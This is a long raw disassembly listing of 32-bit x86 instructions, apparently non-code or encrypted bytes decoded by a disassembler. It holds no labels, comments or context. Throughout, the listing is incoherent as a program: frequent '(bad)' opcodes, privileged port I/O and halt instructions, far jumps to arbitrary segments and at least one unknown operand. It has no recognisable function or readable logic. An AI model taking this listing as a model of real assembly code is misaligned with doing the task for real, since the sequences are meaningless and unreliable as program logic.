  420aa2:	fcmovnu st,st(6)
  420aa4:	mov    ebx,0x69845922
  420aa9:	sbb    BYTE PTR [eax+0x6db14727],ch
  420aaf:	repnz (bad) 
  420ab1:	out    dx,al
  420ab2:	jo     0x420a85
  420ab4:	add    eax,0x4967b6f5
  420ab9:	xchg   esi,eax
  420aba:	imul   esp,DWORD PTR [edx],0xffffffff
  420abd:	xchg   BYTE PTR [esp+ebp*8-0x7f],dl
  420ac1:	inc    ecx
  420ac2:	cld    
  420ac3:	mov    eax,ds:0x93969d77
  420ac8:	gs add ch,0x2f
  420acc:	or     al,0x4b
  420ace:	popa   
  420acf:	stc    
  420ad0:	mov    ds:0xbb41f382,al
  420ad5:	shl    esp,0x9d
  420ad8:	jmp    0x420ac4
  420ada:	xchg   DWORD PTR [ebx],esp
  420adc:	imul   esi,DWORD PTR ss:[ebx+0x1b],0xc46c23c9
  420ae4:	out    0xca,al
  420ae6:	mov    esp,0xc7ddddb
  420aeb:	mov    ds:0x9354af08,al
  420af0:	outs   dx,BYTE PTR ds:[esi]
  420af1:	sbb    DWORD PTR ds:0x32cc7349,0x5fd92e64
  420afb:	repnz lods eax,DWORD PTR ds:[esi]
  420afd:	or     eax,0x1382e8e6
  420b02:	(bad)  
  420b03:	sub    dl,BYTE PTR [edi+0x3ca604d3]
  420b09:	jmp    0xff576a4d
  420b0e:	shl    DWORD PTR [edi-0x398eafdf],1
  420b14:	jle    0x420b1e
  420b16:	mov    edi,0x8d24843c
  420b1b:	mov    al,ds:0xd9e9d29f
  420b20:	out    0xd6,al
  420b22:	push   esi
  420b23:	jae    0x420b37
  420b25:	inc    ecx
  420b26:	add    eax,0x1509c784
  420b2b:	xchg   ebx,eax
  420b2c:	rol    DWORD PTR [ecx-0x438cd2e6],cl
  420b32:	aam    0x65
  420b34:	cdq    
  420b35:	sub    BYTE PTR ds:0x65d5b09d,ah
  420b3b:	call   0x4bb4:0xa945929f
  420b42:	mov    WORD PTR [edx-0x17ca2552],ss
  420b48:	mov    ch,0xd9
  420b4a:	(bad)  
  420b4b:	iret   
  420b4c:	xchg   DWORD PTR [edx],edi
  420b4e:	jae    0x420b65
  420b50:	pop    eax
  420b51:	mov    ecx,0x311267c8
  420b56:	inc    eax
  420b57:	mov    dl,0xb5
  420b59:	mov    BYTE PTR [ebx],ah
  420b5b:	(bad)  
  420b5c:	std    
  420b5d:	into   
  420b5e:	jno    0x420bac
  420b60:	rol    BYTE PTR [eax+0x20],0x6c
  420b64:	cmp    dh,BYTE PTR [eax-0x1ffd57f8]
  420b6a:	jg     0x420bd5
  420b6c:	into   
  420b6d:	mov    eax,ds:0xc6eb2495
  420b72:	out    0x34,al
  420b74:	cli    
  420b75:	lods   al,BYTE PTR ds:[esi]
  420b77:	(bad)  [ebx+edx*1]
  420b7a:	jg     0x420bbd
  420b7c:	neg    DWORD PTR [edi+eiz*1-0x2c2adb77]
  420b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b84:	pop    ebp
  420b85:	sub    eax,0xbd26c9aa
  420b8a:	sahf   
  420b8b:	jmp    0xd3f6:0x168b6b61
  420b92:	xchg   ecx,eax
  420b93:	inc    edi
  420b94:	sub    al,BYTE PTR [ebx-0x69]
  420b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b98:	fnstsw WORD PTR [edi-0x67]
  420b9b:	icebp  
  420b9c:	clc    
  420b9d:	pop    edi
  420b9e:	xchg   ebp,eax
  420b9f:	pop    eax
  420ba0:	fist   WORD PTR [ecx]
  420ba2:	rcr    DWORD PTR [edx+ebp*8-0x3d],cl
  420ba6:	gs loope 0x420be0
  420ba9:	sbb    DWORD PTR [eax+0x6946c3ce],0xfffffff5
  420bb0:	pop    ebp
  420bb1:	cld    
  420bb2:	fs enter 0xe226,0xec
  420bb7:	in     eax,dx
  420bb8:	leave  
  420bb9:	addr16 das 
  420bbb:	inc    ecx
  420bbc:	sbb    edx,0xffffff93
  420bbf:	fdiv   QWORD PTR ds:0x8055c631
  420bc5:	out    dx,al
  420bc6:	inc    eax
  420bc7:	add    ebx,DWORD PTR ds:0x39dd2b71
  420bcd:	ret    0xfdae
  420bd0:	add    ebp,edx
  420bd2:	cmp    BYTE PTR [ebx-0x3bea360d],al
  420bd8:	push   cs
  420bd9:	enter  0xd3ea,0xf5
  420bdd:	mov    dl,0xe0
  420bdf:	or     dl,BYTE PTR [eax-0x1962cb39]
  420be5:	mov    edi,0x716544a5
  420bea:	idiv   dl
  420bec:	fbld   TBYTE PTR [esi+0xbbec50c]
  420bf2:	push   ebp
  420bf3:	inc    ebp
  420bf4:	adc    bh,cl
  420bf6:	inc    ecx
  420bf7:	push   ss
  420bf8:	shl    BYTE PTR [edx+0x10],1
  420bfb:	imul   edi,ebx,0x5b23fa3f
  420c01:	sbb    BYTE PTR [edi+ecx*1],dh
  420c04:	clc    
  420c05:	iret   
  420c06:	fidivr WORD PTR [ecx]
  420c08:	cmp    al,0x82
  420c0a:	das    
  420c0b:	shl    DWORD PTR [edi-0x718a40a1],cl
  420c11:	inc    esp
  420c12:	mov    eax,cs:0x393ee896
  420c18:	js     0x420c6f
  420c1a:	add    bl,BYTE PTR [ecx+0x43196e3c]
  420c20:	sub    BYTE PTR ds:0xd3f886a4,ch
  420c26:	pop    ss
  420c27:	(bad)  
  420c28:	loopne 0x420bd4
  420c2a:	dec    ebx
  420c2b:	jg     0x420c31
  420c2d:	add    eax,0xe8b220a3
  420c32:	mov    BYTE PTR [esi+eax*8-0x7d80e792],0x4d
  420c3a:	aam    0x68
  420c3c:	dec    edi
  420c3d:	leave  
  420c3e:	sub    al,0x34
  420c40:	retf   0x4e0b
  420c43:	ins    DWORD PTR es:[edi],dx
  420c44:	adc    ebx,DWORD PTR [ecx-0x24193a7d]
  420c4a:	xchg   edi,esp
  420c4c:	adc    al,BYTE PTR fs:[ecx+0x2f]
  420c50:	and    edi,DWORD PTR [edi]
  420c52:	sub    dh,BYTE PTR [ebp+0x74]
  420c55:	mul    ah
  420c57:	loopne 0x420c2e
  420c59:	and    eax,0x505fe282
  420c5e:	xchg   edi,eax
  420c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c60:	xor    eax,esi
  420c62:	xlat   BYTE PTR ds:[ebx]
  420c63:	and    eax,0xfa7228d0
  420c68:	jb     0x420c78
  420c6a:	jg     0x420c20
  420c6c:	scas   eax,DWORD PTR es:[edi]
  420c6d:	pop    ss
  420c6e:	mov    WORD PTR [eax-0x6c1654bd],es
  420c74:	cs jbe 0x420cde
  420c77:	mul    BYTE PTR [eax+0x68373434]
  420c7d:	pop    ds
  420c7e:	jmp    0x233d:0x98e99465
  420c85:	cmp    BYTE PTR [edi-0x3463ff06],dh
  420c8b:	es mov esi,0xf50ea60
  420c91:	push   0xffffff96
  420c93:	out    dx,al
  420c94:	jl     0x420c74
  420c96:	mov    dl,0x9f
  420c98:	jbe    0x420d0f
  420c9a:	and    DWORD PTR fs:[ebp-0x2a],0x36c8ca5f
  420ca2:	aaa    
  420ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca5:	dec    eax
  420ca6:	cli    
  420ca7:	jl     0x420cb9
  420ca9:	paddb  mm3,mm5
  420cac:	mov    ebx,0x110c3085
  420cb1:	or     eax,DWORD PTR [ecx]
  420cb3:	mov    bl,0x73
  420cb5:	mov    bl,0xb0
  420cb7:	xchg   esi,eax
  420cb8:	push   ss
  420cb9:	push   ds
  420cba:	mov    edx,0xa8c382ee
  420cbf:	inc    ebx
  420cc0:	dec    esi
  420cc1:	xor    ebx,ebx
  420cc3:	cmp    eax,0xdb935226
  420cc8:	idiv   BYTE PTR [edi]
  420cca:	pop    ebp
  420ccb:	loop   0x420ccc
  420ccd:	push   ebx
  420cce:	adc    al,0x7c
  420cd0:	inc    ebx
  420cd1:	pop    ecx
  420cd2:	call   0x8d76:0xd776530e
  420cd9:	pop    esp
  420cda:	test   BYTE PTR [ecx],0x5e
  420cdd:	mov    dl,0xc7
  420cdf:	ds add eax,0xa75cc196
  420ce5:	mov    dh,0x78
  420ce7:	sar    esp,1
  420ce9:	push   edx
  420cea:	sub    DWORD PTR [ebx+0x2],esp
  420ced:	ror    BYTE PTR [ebp+0x62],cl
  420cf0:	int3   
  420cf1:	jmp    0x9d8c9810
  420cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cf7:	scas   al,BYTE PTR es:[edi]
  420cf8:	push   ds
  420cf9:	dec    esi
  420cfa:	pop    ebp
  420cfb:	loope  0x420d60
  420cfd:	pop    edi
  420cfe:	jg     0x420ca2
  420d00:	pop    esi
  420d01:	aam    0x5f
  420d03:	dec    edi
  420d04:	pop    edi
  420d05:	mov    ah,0x99
  420d07:	loopne 0x420d40
  420d09:	push   esi
  420d0a:	cmp    cl,al
  420d0c:	push   esi
  420d0d:	mov    ch,0x92
  420d0f:	lahf   
  420d10:	cmp    dl,dl
  420d12:	xchg   BYTE PTR [ecx+ebx*4+0x31],bl
  420d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d17:	jle    0x420d4e
  420d19:	adc    DWORD PTR [esi+0x6a552f9c],ebx
  420d1f:	jnp    0x420d72
  420d21:	call   0x8ea7b559
  420d26:	sub    al,0x85
  420d28:	push   edi
  420d29:	lea    ebx,[edx]
  420d2b:	cmp    eax,0x8ba8e272
  420d30:	adc    BYTE PTR [ebp+0x19],dl
  420d33:	invd   
  420d35:	sub    al,dh
  420d37:	xor    bl,dl
  420d39:	(bad)  
  420d3a:	in     eax,0x26
  420d3c:	push   ebx
  420d3d:	pop    eax
  420d3e:	xchg   ebp,eax
  420d3f:	sub    ah,BYTE PTR [ecx-0x20]
  420d42:	sbb    al,0x2
  420d44:	mov    WORD PTR [eax+0x6bc9b106],ss
  420d4a:	div    DWORD PTR [eax-0x32859c0]
  420d50:	arpl   WORD PTR [ecx],bp
  420d52:	(bad)  
  420d53:	in     eax,0xe3
  420d55:	shl    DWORD PTR [edx-0xf],0x11
  420d59:	loopne 0x420d39
  420d5b:	std    
  420d5c:	push   DWORD PTR [edi-0x4f29892e]
  420d62:	ror    BYTE PTR [eax+0xa],0xcf
  420d66:	fs jo  0x420daa
  420d69:	(bad)  
  420d6a:	cwde   
  420d6b:	int3   
  420d6c:	mov    edi,0xff1ea155
  420d71:	lods   al,BYTE PTR ds:[esi]
  420d72:	scas   al,BYTE PTR es:[edi]
  420d73:	call   0x4612:0x5648
  420d79:	mov    ebx,0xbce03cba
  420d7e:	ss in  al,dx
  420d80:	jp     0x420dcc
  420d82:	xor    eax,0x86edfb1b
  420d87:	push   cs
  420d88:	hlt    
  420d89:	dec    esp
  420d8a:	or     ch,dh
  420d8c:	dec    ebp
  420d8d:	idiv   DWORD PTR [esi-0x1a39eae7]
  420d93:	loopne 0x420d7a
  420d95:	test   DWORD PTR [esi-0x58d1268],esi
  420d9b:	adc    esi,DWORD PTR [edx]
  420d9d:	inc    ecx
  420d9e:	mov    edx,0x3f3e8d9c
  420da3:	add    DWORD PTR [ebp-0x5d8c707],esp
  420da9:	or     BYTE PTR [edi+0x60],dl
  420dac:	or     edi,DWORD PTR [edi]
  420dae:	pop    edi
  420daf:	jnp    0x420dce
  420db1:	inc    ebp
  420db2:	sbb    esi,DWORD PTR [edx]
  420db4:	pop    ds
  420db5:	mov    ?,ebx
  420db7:	lock mov al,ds:0x9a9b9826
  420dbd:	lods   eax,DWORD PTR ds:[esi]
  420dbe:	jmp    0xf3051b75
  420dc3:	inc    esi
  420dc4:	stos   DWORD PTR es:[edi],eax
  420dc5:	cmp    esi,DWORD PTR [ebx+0x23]
  420dc8:	and    BYTE PTR [edx],dl
  420dca:	dec    eax
  420dcb:	cdq    
  420dcc:	xor    al,0xe0
  420dce:	mov    DWORD PTR [ebp+0x30],edx
  420dd1:	lods   al,BYTE PTR ds:[esi]
  420dd2:	div    DWORD PTR ds:0xd3ec2734
  420dd8:	mov    ecx,0xcdceeab8
  420ddd:	cli    
  420dde:	mov    ecx,0xada3c0d3
  420de3:	cdq    
  420de4:	sub    esp,0x20
  420de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420de8:	xchg   esi,eax
  420de9:	push   ebp
  420dea:	mov    bh,0x3c
  420dec:	call   0xa576:0x4296ae15
  420df3:	sbb    al,0xff
  420df5:	add    DWORD PTR [edi],esp
  420df7:	mov    ah,0xf4
  420df9:	and    al,0x50
  420dfb:	mov    ch,dh
  420dfd:	mov    eax,0x59ff748c
  420e02:	cdq    
  420e03:	ds aam 0x20
  420e06:	sahf   
  420e07:	pop    esp
  420e08:	fstp   DWORD PTR [ebx]
  420e0a:	push   ecx
  420e0b:	xor    eax,0x3fed5dc4
  420e10:	mov    ebp,0xb7e810e8
  420e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e16:	adc    al,0xe8
  420e18:	mov    ds:0x178fb71,eax
  420e1d:	rcl    cl,1
  420e1f:	ficomp WORD PTR [ebx]
  420e21:	mov    edi,0x88b711e4
  420e26:	pop    ebx
  420e27:	in     al,dx
  420e28:	lods   al,BYTE PTR ds:[esi]
  420e29:	or     BYTE PTR [esi+0x4b],ch
  420e2c:	sti    
  420e2d:	pop    ecx
  420e2e:	cld    
  420e2f:	arpl   dx,ax
  420e31:	into   
  420e32:	xchg   ch,al
  420e34:	sub    DWORD PTR [ebx-0x195fad66],ebx
  420e3a:	mov    ah,0x3a
  420e3c:	addr16 je 0x420e9c
  420e3f:	mov    ds:0x982c445d,eax
  420e44:	repnz adc al,0x2f
  420e47:	jo     0x420e66
  420e49:	mov    ds:0x9802cfd8,eax
  420e4e:	fnsave [ecx+0x15eab799]
  420e54:	inc    esi
  420e55:	xor    BYTE PTR [eax+ecx*1+0xa],al
  420e59:	xchg   edx,eax
  420e5a:	and    esp,0xffffffd4
  420e5d:	add    eax,0xa46a0078
  420e62:	cdq    
  420e63:	xchg   esi,eax
  420e64:	cmc    
  420e65:	ins    BYTE PTR es:[edi],dx
  420e66:	dec    esp
  420e67:	loop   0x420e6a
  420e69:	sahf   
  420e6a:	hlt    
  420e6b:	xor    BYTE PTR [ebp+0x1bb5f6ea],0xb8
  420e72:	in     al,dx
  420e73:	iret   
  420e74:	repz sbb eax,0xf0a8423e
  420e7a:	das    
  420e7b:	enter  0xdda3,0x44
  420e7f:	push   ebp
  420e80:	ins    BYTE PTR es:[edi],dx
  420e81:	outs   dx,BYTE PTR ds:[esi]
  420e82:	cmp    ebx,eax
  420e84:	or     eax,0x57a9d79e
  420e89:	jbe    0x420e49
  420e8b:	push   ecx
  420e8c:	add    al,0x2f
  420e8e:	mov    DWORD PTR [ebx],esp
  420e90:	and    ebx,esi
  420e92:	adc    eax,0x919edff9
  420e97:	fs or  ch,ch
  420e9a:	aad    0x71
  420e9c:	pop    esi
  420e9d:	push   esi
  420e9e:	and    eax,DWORD PTR [eax+0x23]
  420ea1:	mov    esi,0xf506b92d
  420ea6:	jae    0x420e2a
  420ea8:	dec    esi
  420ea9:	(bad)  
  420eaa:	inc    ecx
  420eab:	std    
  420eac:	(bad)  
  420ead:	(bad)  
  420eae:	clc    
  420eaf:	out    dx,al
  420eb0:	push   eax
  420eb1:	dec    ebp
  420eb2:	xchg   ecx,eax
  420eb3:	mov    bl,0xc3
  420eb5:	mov    ah,0x9
  420eb7:	sbb    bl,BYTE PTR [edx-0x76]
  420eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ebb:	iret   
  420ebc:	lahf   
  420ebd:	(bad)  
  420ebf:	cdq    
  420ec0:	sub    DWORD PTR [ebp+0x51],eax
  420ec3:	mov    ecx,eax
  420ec5:	out    0x4c,al
  420ec7:	nop
  420ec8:	mov    ebx,0xbaa82d52
  420ecd:	call   0x1eef:0x6d27d62a
  420ed4:	inc    esp
  420ed5:	mov    ecx,0x56e724c
  420eda:	or     BYTE PTR [ecx-0x3],0x8b
  420ede:	inc    edx
  420edf:	aam    0xc9
  420ee1:	adc    eax,0xc7442237
  420ee6:	dec    esi
  420ee7:	stc    
  420ee8:	(bad)  
  420ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eea:	popf   
  420eeb:	ret    0xf8b0
  420eee:	sub    dl,BYTE PTR [ebp+0x78023d2]
  420ef4:	mov    dh,0xf0
  420ef6:	mov    ecx,0xd93ae255
  420efb:	or     ecx,DWORD PTR [edx]
  420efd:	fsubr  QWORD PTR [esi-0x2d25d9ee]
  420f03:	out    dx,al
  420f04:	xor    BYTE PTR [edi+0x6262dfee],bl
  420f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f0b:	stos   BYTE PTR es:[edi],al
  420f0c:	cld    
  420f0d:	fadd   DWORD PTR [edi+0x6f]
  420f10:	jne    0x420f2d
  420f12:	jmp    0x2627a7b
  420f17:	dec    BYTE PTR [ebx+0x68]
  420f1a:	mov    es:0xb084608,eax
  420f20:	test   eax,0x479d9742
  420f25:	das    
  420f26:	ret    
  420f27:	(bad)  
  420f28:	fldcw  WORD PTR [eax+0x55]
  420f2b:	xor    eax,DWORD PTR [edi-0x19c6af65]
  420f31:	lods   al,BYTE PTR ds:[esi]
  420f32:	sub    edx,DWORD PTR [edx]
  420f34:	jb     0x420ecb
  420f36:	xchg   DWORD PTR [edi+0x53],edx
  420f39:	call   0x85da17b9
  420f3e:	mov    DWORD PTR [ebp-0x2e],esi
  420f41:	rcl    ebx,0x62
  420f44:	jle    0x420f2e
  420f46:	xor    ch,BYTE PTR [edi+0x229c9cd7]
  420f4c:	hlt    
  420f4d:	imul   ebp,DWORD PTR [esi+0x20],0x44e9bff4
  420f54:	push   0x129770b8
  420f59:	cmp    al,0x20
  420f5b:	mov    ah,0x5
  420f5d:	or     eax,DWORD PTR ds:0x556f3e89
  420f63:	push   es
  420f64:	dec    esp
  420f65:	mov    dh,0x92
  420f67:	cwde   
  420f68:	dec    eax
  420f69:	push   0x6cd9a269
  420f6e:	je     0x420f2d
  420f70:	sbb    ecx,ebp
  420f72:	popf   
  420f73:	lahf   
  420f74:	mov    esi,0x2ab718f
  420f79:	jle    0x420fc9
  420f7b:	faddp  st(7),st
  420f7d:	add    DWORD PTR [ecx-0x36c352fb],ebx
  420f83:	sar    DWORD PTR [edx],cl
  420f85:	fs push 0xe95a8f2b
  420f8b:	(bad)  
  420f8c:	es div esi
  420f8f:	or     DWORD PTR [eax+0x1a00b5da],ebx
  420f95:	sub    esi,DWORD PTR [ecx]
  420f97:	ds xchg ebp,eax
  420f99:	add    eax,0xf79ad6e6
  420f9e:	retf   0xe38a
  420fa1:	jbe    0x420f42
  420fa3:	aam    0x5d
  420fa5:	cmp    dh,BYTE PTR [ebx]
  420fa7:	mov    al,0x54
  420fa9:	jg     0x420fbc
  420fab:	xor    eax,0x478e32b2
  420fb0:	adc    DWORD PTR [edi+0x37],eax
  420fb3:	outs   dx,BYTE PTR ds:[esi]
  420fb4:	lea    edx,[eax+ebx*4+0x3f]
  420fb8:	mov    edi,0x365a5ca1
  420fbd:	sub    DWORD PTR [eax+0x5765e9b6],ecx
  420fc3:	mov    cs,WORD PTR [esi+0x67]
  420fc6:	adc    eax,0xd28134f3
  420fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fcc:	push   ds
  420fcd:	push   ds
  420fce:	ds jecxz 0x420fbb
  420fd1:	out    dx,al
  420fd2:	pop    ebp
  420fd3:	icebp  
  420fd4:	repnz and al,0x24
  420fd7:	xor    DWORD PTR [eax+0x1b],esp
  420fda:	fnsave fs:[eax-0x4d]
  420fde:	xlat   BYTE PTR ds:[ebx]
  420fdf:	call   0x4b455fcb
  420fe4:	ss popf 
  420fe6:	jae    0x420fe5
  420fe8:	nop
  420fe9:	icebp  
  420fea:	loop   0x421024
  420fec:	into   
  420fed:	les    ecx,FWORD PTR [ecx+0x2e]
  420ff0:	jo     0x420fed
  420ff2:	adc    eax,0x4b9869fe
  420ff7:	inc    ch
  420ff9:	xlat   BYTE PTR ds:[ebx]
  420ffa:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420ffc:	outs   dx,BYTE PTR ds:[esi]
  420ffd:	scas   al,BYTE PTR es:[edi]
  420ffe:	scas   al,BYTE PTR es:[edi]
  420fff:	mov    ecx,0xa7ac25c0
  421004:	and    ah,ch
  421006:	aam    0xb4
  421008:	int    0x3f
  42100a:	inc    edi
  42100b:	xor    al,bl
  42100d:	mov    BYTE PTR [eax+0x4da53842],cl
  421013:	jb     0x42100b
  421015:	fisub  WORD PTR [ecx+ebp*1+0x4d]
  421019:	clc    
  42101a:	loopne 0x420fd3
  42101c:	in     al,0x32
  42101e:	xchg   ebx,eax
  42101f:	xor    ah,bh
  421021:	out    dx,al
  421022:	sub    esp,DWORD PTR [ebx]
  421024:	jg     0x421074
  421026:	sti    
  421027:	xchg   ecx,eax
  421028:	cmp    BYTE PTR [eax],dh
  42102a:	or     DWORD PTR [ebp+0x2cd4e1d8],esp
  421030:	shl    DWORD PTR [edi],0x4e
  421033:	(bad)  
  421034:	dec    edx
  421035:	mov    eax,0x8b336a8a
  42103a:	ja     0x4210a5
  42103c:	jno    0x42102d
  42103e:	xor    eax,0x30dc3b
  421043:	sub    DWORD PTR [ecx+0x75af8674],esp
  421049:	sub    bh,dh
  42104b:	xchg   BYTE PTR [esi],ah
  42104d:	jle    0x420fe2
  42104f:	xor    al,0x12
  421051:	popa   
  421052:	xchg   ebx,eax
  421053:	push   esp
  421054:	into   
  421055:	mov    esp,0xc07c2e45
  42105a:	sahf   
  42105b:	adc    al,0x79
  42105d:	jecxz  0x421065
  42105f:	pop    ds
  421060:	ja     0x421010
  421062:	push   cs
  421063:	cmpxchg DWORD PTR [eax-0x64],ecx
  421067:	sbb    al,0xd
  421069:	test   eax,0x2bbadf3
  42106e:	in     al,0x47
  421070:	and    bh,ch
  421072:	jl     0x4210cb
  421074:	mov    bl,0xd7
  421076:	xchg   DWORD PTR [esi-0x3],esp
  421079:	call   0xb9f5:0x50098b56
  421080:	(bad)  
  421081:	dec    esp
  421082:	fwait
  421083:	and    DWORD PTR [ebp-0x47],0x25cf6a3e
  42108a:	test   al,0x77
  42108c:	test   eax,0x8913b56c
  421091:	push   eax
  421092:	ror    DWORD PTR [ecx],cl
  421094:	rcr    DWORD PTR [ebx+0x65],1
  421097:	stos   BYTE PTR es:[edi],al
  421098:	or     edi,DWORD PTR [eax]
  42109a:	xchg   esp,eax
  42109b:	xchg   esi,eax
  42109c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42109d:	adc    al,0xb4
  42109f:	dec    DWORD PTR [esp+esi*4]
  4210a2:	cmp    ebx,edx
  4210a4:	loope  0x421080
  4210a6:	in     al,0xf6
  4210a8:	adc    al,0x29
  4210aa:	mov    bl,0x3f
  4210ac:	dec    esi
  4210ad:	rol    DWORD PTR [esi],0x5b
  4210b0:	pop    ecx
  4210b1:	xor    ecx,DWORD PTR [edx]
  4210b3:	cwde   
  4210b4:	cwde   
  4210b5:	pop    ebp
  4210b6:	or     cl,BYTE PTR [edi]
  4210b8:	cld    
  4210b9:	aad    0x95
  4210bb:	out    dx,eax
  4210bc:	push   esi
  4210bd:	ror    DWORD PTR [ebp+edi*1-0x36],cl
  4210c1:	mov    bl,0x3d
  4210c3:	icebp  
  4210c4:	jge    0x4210f1
  4210c6:	mov    bh,al
  4210c8:	cmp    dl,bh
  4210ca:	mov    ch,0x2b
  4210cc:	jp     0x421121
  4210ce:	in     eax,0xfb
  4210d0:	aad    0x1b
  4210d2:	in     al,0x84
  4210d4:	cmp    al,0xb2
  4210d6:	jle    0x421069
  4210d8:	fld    TBYTE PTR [edi]
  4210da:	popa   
  4210db:	mov    ah,0x5e
  4210dd:	imul   ebp,DWORD PTR [ebx+0x7e4a1584],0x5cb79f96
  4210e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210e8:	loop   0x4210c2
  4210ea:	out    dx,eax
  4210eb:	call   0xd27a:0x27f1a1e3
  4210f2:	jg     0x4210b3
  4210f4:	pop    edi
  4210f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210f6:	jg     0x4210a5
  4210f8:	ds (bad) 
  4210fa:	cmp    al,0x2c
  4210fc:	xor    bh,dh
  4210fe:	int    0x78
  421100:	dec    esi
  421101:	push   ds
  421102:	imul   edi,ebx,0x98664274
  421108:	out    dx,eax
  421109:	xlat   BYTE PTR ds:[ebx]
  42110a:	not    DWORD PTR [ecx]
  42110c:	test   BYTE PTR [esi],cl
  42110e:	sub    BYTE PTR [esi+0x11],0x21
  421112:	lahf   
  421113:	dec    ebp
  421114:	dec    ecx
  421115:	dec    ebx
  421116:	hlt    
  421117:	mov    ecx,0xd5c0d25
  42111c:	jne    0x421107
  42111e:	mov    cl,BYTE PTR [ecx]
  421120:	xor    edi,esp
  421122:	pop    edi
  421123:	and    eax,0x2912a3e9
  421128:	rcr    BYTE PTR [eax+eax*8],1
  42112b:	push   ebx
  42112c:	jl     0x4210bb
  42112e:	inc    esi
  42112f:	pop    esp
  421130:	sahf   
  421131:	mov    eax,0x5011c44
  421136:	loopne 0x421121
  421138:	enter  0x5ca,0xf
  42113c:	in     al,0x6b
  42113e:	outs   dx,DWORD PTR ds:[esi]
  42113f:	sti    
  421140:	pop    esi
  421141:	lock ss push edi
  421144:	mov    ah,0x2c
  421146:	enter  0x3df,0x2
  42114a:	cmp    edx,ebp
  42114c:	(bad)  
  42114d:	sti    
  42114e:	pop    ebp
  42114f:	into   
  421150:	and    al,0xc6
  421152:	push   ds
  421153:	aas    
  421154:	push   ebp
  421155:	xchg   esp,eax
  421156:	xchg   edi,eax
  421157:	pop    ebx
  421158:	pop    edi
  421159:	fist   WORD PTR [ebp-0x6e]
  42115c:	setb   BYTE PTR ds:0x6b55e1ee
  421163:	ins    BYTE PTR es:[edi],dx
  421164:	stc    
  421165:	push   esp
  421166:	mov    esi,0xbec23d5c
  42116b:	add    al,0x41
  42116d:	push   eax
  42116e:	popf   
  42116f:	cmp    eax,0x160b2f1f
  421174:	cmp    eax,0x9d5d8069
  421179:	test   ebp,esp
  42117b:	xchg   edx,eax
  42117c:	ror    BYTE PTR ds:0x650b8b3b,cl
  421182:	push   ecx
  421183:	or     bl,BYTE PTR [eax]
  421185:	xchg   ecx,eax
  421186:	daa    
  421187:	out    dx,al
  421188:	leave  
  421189:	dec    esi
  42118a:	ss jl  0x421171
  42118d:	fisubr WORD PTR [esp+ebx*8+0x31]
  421191:	(bad)  
  421192:	mov    ds:0xfcd850de,al
  421197:	xchg   ecx,eax
  421198:	mov    ebp,edx
  42119a:	rcl    ah,cl
  42119c:	jle    0x4211c6
  42119e:	nop
  42119f:	not    ecx
  4211a1:	jge    0x42118f
  4211a3:	xor    eax,0x3d9f2b5
  4211a8:	lock cs push eax
  4211ab:	dec    ebx
  4211ac:	cmp    ch,BYTE PTR [edx-0x32]
  4211af:	retf   
  4211b0:	cdq    
  4211b1:	(bad)  
  4211b2:	xlat   BYTE PTR ds:[ebx]
  4211b3:	cli    
  4211b4:	jle    0x421211
  4211b6:	das    
  4211b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211b8:	jge    0x421173
  4211ba:	(bad)  
  4211bc:	mov    al,0x62
  4211be:	mov    ebp,0xe4b421f1
  4211c3:	scas   eax,DWORD PTR es:[edi]
  4211c4:	adc    DWORD PTR [ecx+0x14],0xffffff93
  4211c8:	fsub   QWORD PTR ds:0xaa3263e3
  4211ce:	(bad)  
  4211cf:	sbb    BYTE PTR [eax+0x2a1304b9],bh
  4211d5:	aaa    
  4211d6:	out    0xda,al
  4211d8:	add    bl,BYTE PTR [edi-0x5d3e50bf]
  4211de:	test   BYTE PTR [ebx+0x7117ef83],bl
  4211e4:	adc    ax,0xf0f
  4211e8:	out    0xe7,eax
  4211ea:	gs inc ecx
  4211ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ed:	jp     0x421216
  4211ef:	jg     0x421231
  4211f1:	inc    esp
  4211f2:	es cld 
  4211f4:	clc    
  4211f5:	add    eax,0xbd01bb5b
  4211fa:	jae    0x421242
  4211fc:	fimul  DWORD PTR [ebp+0x3d1fc95]
  421202:	inc    edx
  421203:	std    
  421204:	aam    0x59
  421206:	jmp    0x520a6c20
  42120b:	jo     0x421232
  42120d:	fnstsw WORD PTR [esi]
  42120f:	aam    0x86
  421211:	ficom  DWORD PTR [edx+ebx*8]
  421214:	mov    edi,DWORD PTR [ecx+eax*4]
  421217:	fdiv   DWORD PTR [esi-0x21]
  42121a:	sbb    BYTE PTR [ebp+0x5763deb1],0x47
  421221:	ror    esi,cl
  421223:	aad    0x55
  421225:	xor    bl,al
  421227:	in     eax,0xdf
  421229:	mov    dl,0x9f
  42122b:	jmp    0xed78a899
  421230:	stos   BYTE PTR es:[edi],al
  421231:	cwde   
  421232:	enter  0xb39e,0x46
  421236:	dec    ecx
  421237:	mov    bl,BYTE PTR [edx+0x3f38064b]
  42123d:	jmp    0x421219
  42123f:	xchg   ebx,eax
  421240:	jmp    0x84d3:0xc798c1c8
  421247:	fwait
  421248:	add    eax,0x1ac659b0
  42124d:	xchg   ebp,eax
  42124e:	xchg   ecx,eax
  42124f:	fcomp  QWORD PTR [ebx]
  421251:	mov    ch,0xb3
  421253:	ret    
  421254:	sbb    eax,0xdfdbd4cd
  421259:	push   ebx
  42125a:	int    0x23
  42125c:	xor    BYTE PTR [esi+eax*4-0x30],bh
  421260:	aas    
  421261:	retf   
  421262:	jmp    0x156ba168
  421267:	mov    ecx,0x2ba79e47
